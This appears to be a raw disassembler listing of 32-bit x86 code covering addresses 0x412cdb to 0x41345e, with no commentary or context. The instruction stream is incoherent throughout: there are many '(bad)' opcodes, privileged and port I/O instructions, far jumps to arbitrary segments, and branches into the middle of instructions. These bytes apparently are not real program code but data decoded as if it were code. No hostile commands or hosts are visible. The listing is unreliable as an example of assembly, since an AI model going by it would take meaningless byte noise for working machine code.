  412cdb:	xor    bh,BYTE PTR [ebx]
  412cdd:	and    DWORD PTR [eax-0x4f5e1cc],0x37
  412ce4:	mov    dl,0x8c
  412ce6:	and    ebx,DWORD PTR [ebx-0x6b]
  412ce9:	xchg   ebp,eax
  412cea:	cmc    
  412ceb:	mov    cl,0x2
  412ced:	pop    ebp
  412cee:	js     0x412c83
  412cf0:	mov    eax,ds:0x4f984fc9
  412cf5:	(bad)  
  412cf6:	push   0x9e0c7416
  412cfb:	jecxz  0x412d69
  412cfd:	mov    DWORD PTR [ebx+ebx*8-0x7a],ebp
  412d01:	repz aam 0x1
  412d04:	cmp    DWORD PTR [ebx],eax
  412d06:	(bad)  
  412d07:	mov    ebx,esi
  412d09:	ins    DWORD PTR es:[edi],dx
  412d0a:	xlat   BYTE PTR ds:[ebx]
  412d0b:	xchg   ebp,eax
  412d0c:	mov    al,0xb5
  412d0e:	jmp    0x412ca2
  412d10:	int    0x9a
  412d12:	(bad)  
  412d13:	jb     0x412d19
  412d15:	push   0x21
  412d17:	(bad)  
  412d18:	dec    ebx
  412d19:	sar    DWORD PTR [edi-0x2],1
  412d1c:	push   ss
  412d1d:	dec    ecx
  412d1e:	xchg   DWORD PTR [eax],ecx
  412d20:	and    al,0x9a
  412d22:	jb     0x412d96
  412d24:	stos   DWORD PTR es:[edi],eax
  412d25:	and    DWORD PTR [eax-0x6a3803e5],eax
  412d2b:	and    eax,0xfa220f19
  412d30:	bnd jge 0x412d4c
  412d33:	and    al,0x65
  412d35:	sbb    eax,0xe9e405d2
  412d3a:	shl    DWORD PTR [edi+0x251068d5],1
  412d40:	adc    DWORD PTR [ebx+0x4b71d3d7],eax
  412d46:	sbb    ecx,DWORD PTR [ebx-0x2abdbef0]
  412d4c:	je     0x412cf1
  412d4e:	lock rcr bl,1
  412d51:	cmp    ch,BYTE PTR ds:0x8b593c70
  412d57:	push   esi
  412d58:	jmp    0x531f:0x20c0f8fc
  412d5f:	sbb    bl,BYTE PTR [edi+ebp*1+0x2af0dab7]
  412d66:	mov    ds:0xedcd88a,al
  412d6b:	loop   0x412d88
  412d6d:	or     al,0xef
  412d6f:	cmp    eax,0x334bd21
  412d74:	pop    edi
  412d75:	jecxz  0x412d60
  412d77:	jae    0x412dd8
  412d79:	xchg   edx,eax
  412d7a:	stc    
  412d7b:	jg     0x412d50
  412d7d:	pushf  
  412d7e:	lahf   
  412d7f:	or     ah,BYTE PTR [edx+0x47]
  412d82:	add    DWORD PTR [esi-0x1831f791],0x30
  412d89:	mov    al,0x21
  412d8b:	mov    edx,0xe46d39f1
  412d90:	cmp    ebx,DWORD PTR [esi]
  412d92:	mov    ah,0xa3
  412d94:	sub    eax,0x6f6d19c3
  412d99:	mov    es,WORD PTR [eax-0x77]
  412d9c:	inc    ebp
  412d9d:	mov    ch,0xfd
  412d9f:	clc    
  412da0:	arpl   WORD PTR [ecx],bx
  412da2:	cwde   
  412da3:	jae    0x412d55
  412da5:	push   eax
  412da6:	adc    dh,ah
  412da8:	jge    0x412d46
  412daa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dab:	mov    edi,0xff306164
  412db0:	jmp    0x9bdfe4c
  412db5:	mov    ebx,0xb9c49a13
  412dba:	aad    0x41
  412dbc:	or     ebx,DWORD PTR [eax]
  412dbe:	loope  0x412e12
  412dc0:	je     0x412dd4
  412dc2:	jmp    DWORD PTR [ebx+0xdcc738b]
  412dc8:	inc    ebx
  412dc9:	sbb    ah,BYTE PTR [ebp-0x35]
  412dcc:	add    ebp,DWORD PTR [edi-0x69]
  412dcf:	sbb    al,0xd
  412dd1:	or     BYTE PTR [ecx+0x59],ah
  412dd4:	sahf   
  412dd5:	inc    ebp
  412dd6:	and    ch,BYTE PTR [edx+0x420b002b]
  412ddc:	ins    DWORD PTR es:[edi],dx
  412ddd:	fcomi  st,st(4)
  412ddf:	loopne 0x412e26
  412de1:	fild   DWORD PTR [bx+di+0x509e]
  412de6:	into   
  412de7:	xchg   esp,eax
  412de8:	sbb    al,0xed
  412dea:	ds rol ah,0xf1
  412dee:	jno    0x412d97
  412df0:	icebp  
  412df1:	push   0x2f76e68a
  412df6:	pop    ecx
  412df7:	and    al,0x2b
  412df9:	pop    esi
  412dfa:	mov    dl,0x3e
  412dfc:	jge    0x412e59
  412dfe:	or     esi,DWORD PTR [edi]
  412e00:	inc    esi
  412e01:	neg    DWORD PTR [edi]
  412e03:	mov    ecx,0xa783e26b
  412e08:	push   ecx
  412e09:	mov    ebp,0x570e3353
  412e0e:	pop    edi
  412e0f:	jo     0x412e22
  412e11:	xor    DWORD PTR [edi-0x4],0x6f
  412e15:	xor    eax,0x6fadcfa5
  412e1a:	fs mov edi,0xa3b2e672
  412e20:	xchg   esi,eax
  412e21:	xchg   esi,eax
  412e22:	bound  edx,QWORD PTR fs:[esi]
  412e25:	push   ds
  412e26:	and    bh,0xde
  412e29:	pop    ebx
  412e2a:	pop    ss
  412e2b:	lds    ecx,FWORD PTR [ebx-0x55]
  412e2e:	add    DWORD PTR [ebx],ebp
  412e30:	adc    edx,DWORD PTR [edi+0xb]
  412e33:	push   edi
  412e34:	dec    esi
  412e35:	xlat   BYTE PTR ds:[ebx]
  412e36:	dec    edx
  412e37:	mov    eax,0xbe53df7
  412e3c:	xchg   ebx,eax
  412e3d:	js     0x412e46
  412e3f:	lods   al,BYTE PTR ds:[esi]
  412e40:	in     eax,0x8
  412e42:	pop    edi
  412e43:	inc    edx
  412e44:	in     eax,0x1b
  412e46:	outs   dx,BYTE PTR ds:[esi]
  412e47:	xlat   BYTE PTR ds:[ebx]
  412e48:	(bad)  
  412e49:	mov    ebx,edi
  412e4b:	ins    BYTE PTR es:[edi],dx
  412e4c:	cli    
  412e4d:	pop    ds
  412e4e:	cmp    al,0x99
  412e50:	hlt    
  412e51:	mov    dh,0x2d
  412e53:	xchg   edx,eax
  412e54:	xor    al,0x68
  412e56:	scas   al,BYTE PTR es:[edi]
  412e57:	in     al,0x31
  412e59:	(bad)  
  412e5b:	lods   al,BYTE PTR ds:[esi]
  412e5c:	mov    ebp,0x39e9c5be
  412e61:	scas   al,BYTE PTR es:[edi]
  412e62:	or     BYTE PTR [ecx-0x5248ae6d],0xc3
  412e69:	inc    edi
  412e6a:	pop    ds
  412e6b:	rcr    BYTE PTR [eax],1
  412e6d:	mov    edx,0xc93ac838
  412e72:	mov    bh,0x5d
  412e74:	cmp    edi,edx
  412e76:	sbb    ch,BYTE PTR [eax]
  412e78:	xchg   esi,eax
  412e79:	mov    eax,0xfe46afd4
  412e7e:	mov    dh,cl
  412e80:	and    ebx,DWORD PTR [edx+0x7b]
  412e83:	ret    0x5f91
  412e86:	ficom  DWORD PTR [eax-0x6b]
  412e89:	and    eax,0x4701e6a2
  412e8e:	mov    eax,ds:0x8b383ded
  412e93:	or     dl,BYTE PTR [eax]
  412e95:	fwait
  412e96:	pushf  
  412e97:	adc    BYTE PTR cs:[ecx+0x34e47ca],dh
  412e9e:	fdivrp st(5),st
  412ea0:	aam    0x40
  412ea2:	imul   BYTE PTR [ebx+0x4960722f]
  412ea8:	rol    BYTE PTR [edx+ebx*2+0x11],0x56
  412ead:	pop    ecx
  412eae:	(bad)  
  412eaf:	push   edx
  412eb0:	xchg   esi,eax
  412eb1:	aaa    
  412eb2:	push   esi
  412eb3:	mov    dh,0x14
  412eb5:	stc    
  412eb6:	arpl   cx,sp
  412eb8:	pop    esi
  412eb9:	dec    ebx
  412eba:	sub    eax,0x3aa44c31
  412ebf:	mov    al,0x9e
  412ec1:	and    ebx,edi
  412ec3:	pop    esp
  412ec4:	iret   
  412ec5:	vmaxpd xmm4,xmm6,XMMWORD PTR [ebx]
  412ec9:	or     al,0xcb
  412ecb:	lahf   
  412ecc:	lds    ecx,FWORD PTR [ebp+0x70]
  412ecf:	push   edi
  412ed0:	lea    ecx,[edi+0x27]
  412ed3:	sbb    bh,BYTE PTR [edx-0x6a]
  412ed6:	aas    
  412ed7:	cld    
  412ed8:	push   edi
  412ed9:	lea    edi,[edx-0x19]
  412edc:	dec    esi
  412edd:	and    al,0x26
  412edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ee0:	icebp  
  412ee1:	sub    eax,0x7f4975f8
  412ee6:	inc    esp
  412ee7:	add    BYTE PTR [esi],ah
  412ee9:	mov    ds:0x30d7fbc7,eax
  412eee:	stos   DWORD PTR es:[edi],eax
  412eef:	test   al,0xed
  412ef1:	or     bh,dl
  412ef3:	imul   ecx,edx,0x59655dbe
  412ef9:	dec    edi
  412efa:	clc    
  412efb:	add    al,0x4e
  412efd:	pop    ds
  412efe:	ja     0x412e8c
  412f00:	pop    ecx
  412f01:	mov    al,0x57
  412f03:	imul   DWORD PTR [eax]
  412f05:	in     al,0x23
  412f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f08:	push   es
  412f09:	cli    
  412f0a:	scas   eax,DWORD PTR es:[edi]
  412f0b:	mov    esp,0xf37b33e5
  412f10:	cmp    eax,ebp
  412f12:	cs data16 sti 
  412f15:	push   0xffffff95
  412f17:	imul   DWORD PTR [edx]
  412f19:	mov    ds:0x74f428e2,al
  412f1e:	mov    ds:0x69cd1363,al
  412f23:	xor    al,0x10
  412f25:	and    esp,DWORD PTR [ebp-0xe786131]
  412f2b:	cmc    
  412f2c:	fnstsw WORD PTR [edx+0x12]
  412f2f:	shr    cl,0xa2
  412f32:	cmp    DWORD PTR [eax+0x4f],ebp
  412f35:	cdq    
  412f36:	xor    ah,BYTE PTR [edx]
  412f38:	pop    ebp
  412f3a:	nop
  412f3b:	push   ds
  412f3c:	popa   
  412f3d:	jmp    0x625e1062
  412f42:	add    eax,0x50e82b1e
  412f47:	inc    esi
  412f48:	leave  
  412f49:	mov    WORD PTR [edi-0x4e],ss
  412f4c:	or     BYTE PTR [eax+0x5977d63c],bl
  412f52:	call   0x3565:0x43cd55db
  412f59:	mov    al,0x96
  412f5b:	mov    ch,0x89
  412f5d:	inc    ecx
  412f5e:	sub    edi,ebx
  412f60:	pop    edi
  412f61:	sbb    BYTE PTR [edx-0x69f2176],0x1
  412f68:	push   ds
  412f69:	push   cs
  412f6a:	push   edi
  412f6b:	lock cmp esi,DWORD PTR [ecx+0x3e42e571]
  412f72:	retfw  
  412f74:	sbb    DWORD PTR [ecx+edx*2+0x349ca10a],eax
  412f7b:	daa    
  412f7c:	outs   dx,BYTE PTR ds:[esi]
  412f7d:	add    al,0xe0
  412f7f:	arpl   WORD PTR [ebx+0x320f164e],sp
  412f85:	scas   al,BYTE PTR es:[edi]
  412f86:	jnp    0x412f36
  412f88:	sti    
  412f89:	dec    DWORD PTR [ebx+0x47]
  412f8c:	ret    0x9073
  412f8f:	xchg   esi,eax
  412f90:	out    0xf,eax
  412f92:	add    al,0x84
  412f94:	es sti 
  412f96:	jecxz  0x412fea
  412f98:	xchg   esp,eax
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	stc    
  412f9b:	mov    ds:0x3a6b9564,al
  412fa0:	dec    ecx
  412fa1:	adc    DWORD PTR [eax],esi
  412fa3:	mov    WORD PTR [edx],ss
  412fa5:	cs ret 
  412fa7:	stos   DWORD PTR es:[edi],eax
  412fa8:	test   eax,0x2baba228
  412fad:	adc    eax,0x1da2377b
  412fb2:	ss jmp 0x6b853eb2
  412fb8:	aam    0xf1
  412fba:	aas    
  412fbb:	int    0xac
  412fbd:	or     DWORD PTR [ebp-0x67],ebp
  412fc0:	dec    ecx
  412fc1:	mov    bh,0x46
  412fc3:	imul   ebx,DWORD PTR ds:0x6e4028f3,0x52
  412fca:	aam    0xcc
  412fcc:	inc    eax
  412fcd:	(bad)  
  412fce:	xchg   ebx,eax
  412fcf:	mov    bl,0x8e
  412fd1:	jge    0x412fc8
  412fd3:	xor    DWORD PTR [ebx+0x70091321],esi
  412fd9:	aas    
  412fda:	into   
  412fdb:	push   esp
  412fdc:	scas   al,BYTE PTR es:[edi]
  412fdd:	test   eax,0xf51bd150
  412fe2:	xor    ch,0x5d
  412fe5:	jno    0x413020
  412fe7:	push   esi
  412fe8:	adc    DWORD PTR [ecx+0x7d0fa10c],edx
  412fee:	iret   
  412fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff0:	and    eax,0x8045f8ee
  412ff5:	sbb    BYTE PTR [ecx],0xd2
  412ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff9:	and    bh,dl
  412ffb:	test   BYTE PTR [edx-0x1b],ch
  412ffe:	in     eax,0xf7
  413000:	adc    al,0x6e
  413002:	in     eax,dx
  413003:	les    esi,FWORD PTR [esi-0x63]
  413006:	aaa    
  413007:	sbb    eax,0xd918791d
  41300c:	xchg   ebp,eax
  41300d:	shl    DWORD PTR [ecx-0x5b070e22],0x73
  413014:	jg     0x413049
  413016:	lea    edi,[ebx-0x44]
  413019:	outs   dx,BYTE PTR ds:[esi]
  41301a:	cdq    
  41301b:	pushf  
  41301c:	repnz pop esi
  41301e:	push   ds
  41301f:	cmp    bl,BYTE PTR [eax]
  413021:	sub    BYTE PTR [eax+esi*1-0x2f],dh
  413025:	or     al,0xa1
  413027:	add    DWORD PTR [ebx+0x1a42d381],edx
  41302d:	dec    ebx
  41302e:	cld    
  41302f:	retf   0xaf93
  413032:	cmp    BYTE PTR [ebp-0x3e],0x75
  413036:	pop    di
  413038:	test   esi,edx
  41303a:	or     ah,BYTE PTR [ecx]
  41303c:	(bad)  
  41303d:	jae    0x413086
  41303f:	mov    esp,0x1c64d02f
  413044:	push   ss
  413045:	lods   eax,DWORD PTR ds:[esi]
  413046:	xchg   edi,eax
  413047:	pop    esi
  413048:	xor    DWORD PTR [ebx+edx*1+0x3569c0b9],edi
  41304f:	inc    esi
  413050:	pop    edx
  413051:	test   eax,0x670ad164
  413056:	mov    dl,0xb9
  413058:	sbb    cl,BYTE PTR [ecx]
  41305a:	cmp    BYTE PTR [edi-0xa],ah
  41305d:	and    ecx,0xffffff96
  413060:	stos   BYTE PTR es:[edi],al
  413061:	in     al,0xdb
  413063:	jo     0x413008
  413065:	imul   bl
  413067:	hlt    
  413068:	daa    
  413069:	and    ebx,edi
  41306b:	pop    ds
  41306c:	or     eax,0xfdeddefd
  413071:	pop    eax
  413072:	pop    ss
  413073:	call   0x4fd1aa6
  413078:	(bad)
  41307b:	mov    al,ds:0x17417ab3
  413080:	loop   0x413077
  413082:	aam    0x77
  413084:	ins    BYTE PTR es:[edi],dx
  413085:	add    ebx,DWORD PTR [edi+0x701cf65f]
  41308b:	sti    
  41308c:	sbb    DWORD PTR [edx-0x4c9086e5],ecx
  413092:	push   ss
  413093:	in     al,dx
  413094:	push   eax
  413095:	xchg   bh,bl
  413097:	and    DWORD PTR [ecx+ecx*4],0xdb3e7372
  41309e:	sub    BYTE PTR ds:0x574aab09,ah
  4130a4:	sub    al,BYTE PTR [ebx+0x2f7f4eb0]
  4130aa:	mov    ebp,0x10e58a7a
  4130af:	mov    edi,0x6c483694
  4130b4:	pop    ds
  4130b5:	mov    ebx,0xa160699d
  4130ba:	ja     0x41312a
  4130bc:	hlt    
  4130bd:	sub    DWORD PTR [edi+ebp*8-0x2c2fe173],eax
  4130c4:	fwait
  4130c5:	mov    ecx,esi
  4130c7:	repnz hlt 
  4130c9:	ss retf 
  4130cb:	xchg   edx,ebp
  4130cd:	or     al,0x11
  4130cf:	in     eax,dx
  4130d0:	(bad)  
  4130d1:	fimul  WORD PTR [ebx-0xd94602d]
  4130d7:	cmp    DWORD PTR [eax+0x15],ebp
  4130da:	pop    eax
  4130db:	pop    ds
  4130dc:	jecxz  0x41309f
  4130de:	jg     0x4130ab
  4130e0:	inc    eax
  4130e1:	cmc    
  4130e2:	inc    ebp
  4130e3:	mov    edx,0x78b41572
  4130e8:	jmp    0x4130c5
  4130ea:	push   ebp
  4130eb:	pop    ss
  4130ec:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4130ee:	jg     0x41316b
  4130f0:	pop    edx
  4130f1:	xchg   ebx,eax
  4130f2:	ja     0x413102
  4130f4:	adc    eax,0x9f55eda
  4130f9:	adc    al,0x65
  4130fb:	xor    DWORD PTR [edi-0x1807cf95],edi
  413101:	xchg   edx,eax
  413102:	mov    eax,0xcb3a781d
  413107:	je     0x41308d
  413109:	stos   BYTE PTR es:[edi],al
  41310a:	mov    ds:0xe1832ce5,eax
  41310f:	ret    0x4aac
  413112:	mov    ebx,0xfa2589cc
  413117:	jp     0x4130de
  413119:	pop    ebp
  41311a:	push   ebp
  41311b:	rcr    esp,cl
  41311d:	mov    ecx,0x46430d55
  413122:	sti    
  413123:	mov    WORD PTR [ebx+0x528d2d2c],gs
  413129:	mov    BYTE PTR [ecx],bh
  41312b:	sar    BYTE PTR [ebx-0x6a],1
  41312e:	inc    edi
  41312f:	imul   esi,ebp,0x5b
  413132:	sahf   
  413133:	fdiv   DWORD PTR ds:0x52027cd8
  413139:	in     al,0xd1
  41313b:	mov    ecx,0xbca28324
  413140:	xchg   ebx,eax
  413141:	mov    ebx,0xb7ed95f7
  413146:	pop    eax
  413147:	add    BYTE PTR [edx-0x34],bh
  41314a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41314b:	fist   WORD PTR [esp+ecx*1+0x75482169]
  413152:	cpuid  
  413154:	mov    dl,0xd6
  413156:	test   DWORD PTR gs:[edx+0x713cdaa7],ebx
  41315d:	inc    bh
  41315f:	lods   al,BYTE PTR ds:[esi]
  413160:	cwde   
  413161:	pop    ecx
  413162:	jl     0x413112
  413164:	pextrw ecx,mm1,0x5d
  413168:	in     eax,dx
  413169:	adc    eax,0x4ae646ad
  41316e:	jmp    0x4130f4
  413170:	and    al,0xc
  413173:	in     eax,0x28
  413175:	cmp    ch,BYTE PTR [edi]
  413177:	mov    dh,0xa2
  413179:	nop
  41317a:	dec    esp
  41317b:	rcl    DWORD PTR [ecx+0xa],0xd2
  41317f:	(bad)  
  413180:	mov    dh,0x21
  413182:	mov    ebp,DWORD PTR [ebx-0xc]
  413185:	xchg   ebx,eax
  413186:	push   ss
  413187:	push   edx
  413188:	add    cl,al
  41318a:	cmp    al,BYTE PTR [ebp+0x47]
  41318d:	(bad)  
  41318e:	sahf   
  41318f:	add    eax,0xfa2452f5
  413194:	push   ebx
  413195:	popa   
  413196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413197:	jp     0x4131ee
  413199:	call   0xe777:0x63309a4
  4131a0:	ret    
  4131a1:	in     al,dx
  4131a2:	not    DWORD PTR [ecx]
  4131a4:	dec    esi
  4131a5:	jmp    0x4131f2
  4131a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131a8:	(bad)  
  4131a9:	fidiv  WORD PTR [ebp-0x28]
  4131ac:	js     0x41316e
  4131ae:	sbb    edi,ebp
  4131b0:	adc    edi,0x54e9c619
  4131b6:	out    0xa6,eax
  4131b8:	and    esi,eax
  4131ba:	cmp    esp,0xded5c31b
  4131c0:	ins    DWORD PTR es:[edi],dx
  4131c1:	jp     0x413226
  4131c3:	jbe    0x41315c
  4131c5:	inc    edx
  4131c6:	ret    0xf1d9
  4131c9:	sub    BYTE PTR [ebp-0x11007638],cl
  4131cf:	pusha  
  4131d0:	cwde   
  4131d1:	ret    0x2226
  4131d4:	mov    bl,bh
  4131d6:	fbstp  TBYTE PTR [edx-0x34]
  4131d9:	retf   0x1a07
  4131dc:	sar    eax,0xbe
  4131df:	jmp    0xb728:0x7487171f
  4131e6:	outs   dx,DWORD PTR ds:[esi]
  4131e7:	inc    esp
  4131e8:	fs cs mov esp,0x9e56818e
  4131ef:	pop    ebp
  4131f0:	mov    dh,0x7a
  4131f2:	add    DWORD PTR [edx],0xffffff9b
  4131f5:	rol    ch,0x21
  4131f8:	les    ebx,FWORD PTR [edi+ecx*1]
  4131fb:	sub    ebx,DWORD PTR [ebx+eax*4-0x77]
  4131ff:	daa    
  413200:	add    bl,BYTE PTR [eax]
  413202:	les    esp,FWORD PTR [edi-0x42]
  413205:	or     al,0xe8
  413207:	push   ds
  413208:	mov    dh,0x67
  41320a:	je     0x413201
  41320c:	popa   
  41320d:	outs   dx,DWORD PTR ds:[esi]
  41320e:	lds    edi,FWORD PTR [ebp-0x2ab266e8]
  413214:	test   BYTE PTR [edi+0x7e],dl
  413217:	xor    al,bl
  413219:	mov    ds:0x162f4d46,al
  41321e:	sahf   
  41321f:	fnstenv ds:0x8fac8ae5
  413225:	jle    0x41323d
  413227:	retf   0x75a5
  41322a:	pop    edx
  41322b:	and    eax,0x5ce2eab8
  413230:	add    DWORD PTR [ebx-0x26ba45e2],ebp
  413236:	cld    
  413237:	cdq    
  413238:	jecxz  0x413221
  41323a:	adc    bh,BYTE PTR [eax+0x3821a2f6]
  413240:	cdq    
  413241:	add    al,0x22
  413243:	add    eax,DWORD PTR [ebp+0x7c7e776e]
  413249:	mov    al,0xff
  41324b:	xor    esp,DWORD PTR [ecx+edx*8-0x5a]
  41324f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413250:	jmp    0xd8a7b3b4
  413255:	sbb    al,0x2f
  413257:	addr16 js 0x413260
  41325a:	out    dx,al
  41325b:	push   cs
  41325c:	(bad)  
  41325d:	mov    eax,0xf83d533c
  413262:	rol    BYTE PTR [edi],cl
  413264:	pop    esp
  413265:	jnp    0x413281
  413267:	ret    0x3b3
  41326a:	dec    ecx
  41326b:	bnd ss jmp 0x413247
  41326f:	leave  
  413270:	xlat   BYTE PTR ds:[ebx]
  413271:	push   esi
  413272:	push   es
  413273:	cli    
  413274:	lahf   
  413275:	or     al,BYTE PTR [esi]
  413277:	mov    ch,0x20
  413279:	(bad)  
  41327a:	stc    
  41327b:	loopne 0x413232
  41327d:	stos   DWORD PTR es:[edi],eax
  41327e:	dec    edi
  41327f:	jno    0x413270
  413281:	pop    edi
  413282:	out    dx,eax
  413283:	(bad)  
  413284:	cdq    
  413285:	push   esi
  413286:	mov    ah,0xd1
  413288:	call   0xdbfc:0xdf74d7bc
  41328f:	bound  ebx,QWORD PTR [edi-0x7067a63e]
  413295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413296:	dec    esp
  413297:	or     bl,BYTE PTR [ebx-0x1fd58678]
  41329d:	xor    ecx,DWORD PTR [ebx-0x7eb36bb2]
  4132a3:	and    DWORD PTR [esi+0x13],0xb3560ba5
  4132aa:	lods   al,BYTE PTR ds:[esi]
  4132ab:	sbb    al,0xe9
  4132ad:	fdiv   st(3),st
  4132af:	icebp  
  4132b0:	test   ebx,0xab9ea7a9
  4132b6:	push   edi
  4132b7:	daa    
  4132b8:	out    0xcd,eax
  4132ba:	fwait
  4132bb:	test   eax,0x5f58596c
  4132c0:	hlt    
  4132c1:	cmc    
  4132c2:	jle    0x41327e
  4132c4:	mov    ah,0xf7
  4132c6:	into   
  4132c7:	mov    cl,0x79
  4132c9:	add    ah,BYTE PTR [edx-0x79]
  4132cc:	cmp    al,0xc2
  4132ce:	(bad)  
  4132cf:	adc    al,0x41
  4132d1:	sbb    BYTE PTR [esi],dh
  4132d3:	sub    ch,BYTE PTR [ebx-0x26]
  4132d6:	test   DWORD PTR [edx+0x0],esp
  4132d9:	sub    eax,0xaedc8860
  4132de:	stos   BYTE PTR es:[edi],al
  4132df:	retf   0xbf49
  4132e2:	sbb    eax,0xb1ac2c5b
  4132e7:	lds    ebp,FWORD PTR [edx-0x28bec9fe]
  4132ed:	dec    ebp
  4132ee:	pop    ss
  4132ef:	(bad)  
  4132f0:	std    
  4132f1:	dec    ebp
  4132f2:	rcr    BYTE PTR [edi],cl
  4132f4:	test   al,0xb1
  4132f6:	retf   0xe0e2
  4132f9:	xor    al,0xbc
  4132fb:	cdq    
  4132fc:	mov    al,ds:0x6bfd3c3f
  413301:	adc    eax,esi
  413303:	out    0x60,eax
  413305:	add    BYTE PTR [edi],al
  413307:	dec    eax
  413308:	mov    bl,0xdc
  41330a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41330b:	mov    ch,0x22
  41330d:	lock cmp BYTE PTR [edx-0x1ad22a2a],al
  413314:	jns    0x4132d3
  413316:	jp     0x4132d4
  413318:	push   esi
  413319:	push   0x3
  41331b:	inc    ecx
  41331c:	inc    eax
  41331d:	and    al,ch
  41331f:	mov    ebx,0x8ef7bea4
  413324:	xchg   ebp,eax
  413325:	fadd   QWORD PTR [ecx-0x77e689a2]
  41332b:	mov    fs,WORD PTR [eax+0x723c61eb]
  413331:	push   esi
  413332:	inc    ecx
  413333:	mov    al,ds:0xa574e213
  413338:	and    dh,ah
  41333a:	(bad)  
  41333b:	enter  0x5c05,0xee
  41333f:	addr16 in al,dx
  413341:	mov    BYTE PTR [ecx-0x2a],cl
  413344:	into   
  413345:	fild   DWORD PTR [edi+0x2b4e0f56]
  41334b:	pop    ss
  41334c:	lds    ebx,FWORD PTR [eax]
  41334e:	js     0x413385
  413350:	ins    DWORD PTR es:[edi],dx
  413351:	aaa    
  413352:	push   edx
  413353:	xchg   edx,esp
  413355:	fbstp  TBYTE PTR [ebx-0x4c]
  413358:	scas   eax,DWORD PTR es:[edi]
  413359:	adc    dh,BYTE PTR [eax+ecx*1+0x55]
  41335d:	fmul   QWORD PTR [ebx-0x7e]
  413360:	pop    edi
  413361:	inc    edx
  413362:	fwait
  413363:	and    ebp,esp
  413365:	lahf   
  413366:	adc    BYTE PTR [ecx],dl
  413368:	outs   dx,DWORD PTR ds:[esi]
  413369:	popa   
  41336a:	out    0xce,eax
  41336c:	fstp   TBYTE PTR [edi]
  41336e:	cmp    al,0x1f
  413370:	push   edi
  413371:	ret    0x149e
  413374:	cmp    ebp,ecx
  413376:	push   cs
  413377:	ins    BYTE PTR es:[edi],dx
  413378:	xor    ah,BYTE PTR [edx+0x48653ed]
  41337e:	inc    esp
  41337f:	or     eax,0xc3f90e0a
  413384:	lods   eax,DWORD PTR ds:[esi]
  413385:	push   ebp
  413386:	hlt    
  413387:	pop    esi
  413388:	loopne 0x413386
  41338a:	stc    
  41338b:	outs   dx,DWORD PTR ds:[esi]
  41338c:	(bad)  
  41338d:	or     DWORD PTR [edx-0x4e],ecx
  413390:	sub    esi,DWORD PTR [ebp-0x49]
  413393:	xor    DWORD PTR [ebx],ecx
  413395:	js     0x4133cf
  413397:	popa   
  413398:	je     0x413414
  41339a:	(bad)  
  41339b:	pop    ebp
  41339c:	adc    BYTE PTR [edi],0x5d
  41339f:	dec    edi
  4133a0:	inc    edx
  4133a1:	dec    esi
  4133a2:	dec    ebx
  4133a3:	mov    eax,0xc9dff05
  4133a8:	(bad)  
  4133a9:	sbb    esp,DWORD PTR [esi-0x25]
  4133ac:	xchg   ebx,eax
  4133ad:	mov    cl,BYTE PTR [ebx]
  4133af:	psrlq  mm0,QWORD PTR [ecx+0x4a]
  4133b3:	push   0x6d8218bf
  4133b8:	bound  eax,QWORD PTR [ebx]
  4133ba:	inc    ebp
  4133bb:	fidiv  WORD PTR [ecx]
  4133bd:	pop    ecx
  4133be:	inc    esp
  4133bf:	sbb    eax,0xe4e11a4d
  4133c4:	xchg   edx,eax
  4133c5:	xchg   edx,eax
  4133c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133c7:	or     al,0xcd
  4133c9:	pop    ebx
  4133ca:	xlat   BYTE PTR ds:[ebx]
  4133cb:	add    DWORD PTR [esi+0x21fe92a8],0x6f
  4133d2:	inc    ecx
  4133d3:	gs sbb bl,0x15
  4133d7:	retf   
  4133d8:	stos   BYTE PTR es:[edi],al
  4133d9:	cmp    edx,DWORD PTR [ebx]
  4133db:	test   al,0x8c
  4133dd:	inc    esi
  4133de:	xor    BYTE PTR [ebx-0x1d2f1a50],0xbc
  4133e5:	pop    edi
  4133e6:	scas   eax,DWORD PTR es:[edi]
  4133e7:	push   edi
  4133e8:	push   edx
  4133e9:	cmp    edx,DWORD PTR [ecx-0x7f]
  4133ec:	lock add DWORD PTR [edx-0x6e],esi
  4133f0:	xor    eax,0x3cbdd07a
  4133f5:	es push cs
  4133f7:	jecxz  0x4133eb
  4133f9:	sbb    al,0xc0
  4133fb:	xor    ecx,DWORD PTR [eax+0x79]
  4133fe:	mov    edi,0x84451e50
  413403:	bound  eax,QWORD PTR [ebp+ebp*2+0x75]
  413407:	std    
  413408:	fst    QWORD PTR [ecx+0x49]
  41340b:	mov    esi,0x415eadd3
  413410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413411:	ins    BYTE PTR es:[edi],dx
  413412:	jae    0x413437
  413414:	and    ch,ch
  413416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413417:	loopne 0x4133f8
  413419:	sub    DWORD PTR [edi-0x1b86aaf2],ebx
  41341f:	loop   0x41349a
  413421:	cld    
  413422:	xchg   ecx,eax
  413423:	inc    esi
  413424:	cmc    
  413425:	cli    
  413426:	adc    ah,BYTE PTR [eax-0x5926cf85]
  41342c:	push   es
  41342d:	mov    ah,bl
  41342f:	adc    eax,0x5fa8f03
  413434:	jns    0x41347f
  413436:	popf   
  413437:	fbld   TBYTE PTR [ebx-0x30ee58ca]
  41343d:	js     0x413499
  41343f:	dec    esi
  413440:	cmp    eax,DWORD PTR [ebx+0x59]
  413443:	jb     0x413419
  413445:	jnp    0x413457
  413447:	jmp    0x60e234c9
  41344c:	xchg   ecx,eax
  41344d:	cli    
  41344e:	inc    esi
  41344f:	dec    edx
  413450:	inc    edi
  413451:	gs loope 0x41345f
  413454:	(bad)  
  413455:	jge    0x413423
  413457:	sti    
  413458:	inc    eax
  413459:	or     eax,edx
  41345b:	xchg   ebx,eax
  41345c:	addr16 std 
  41345e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
